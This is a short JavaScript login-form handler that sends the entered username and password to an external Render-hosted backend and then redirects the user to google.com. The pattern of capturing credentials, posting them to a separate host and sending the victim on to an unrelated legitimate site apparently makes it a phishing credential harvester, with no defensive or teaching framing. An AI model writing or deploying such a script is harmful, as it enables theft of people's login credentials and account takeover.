const form = document.getElementById("loginForm");

form.addEventListener("submit", async (e) => {

    e.preventDefault();

    const data = {
        username: document.getElementById("username").value,
        password: document.getElementById("password").value
    };

    try {

        const response = await fetch(
            "https://backend-4clp.onrender.com/submit",
            {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify(data)
            }
        );

        const result = await response.json();

        if (result.success) {

        window.location.href = "https://www.google.com/";
}

    } catch (error) {

        console.log(error);

        alert("Could not connect to backend");
    }
});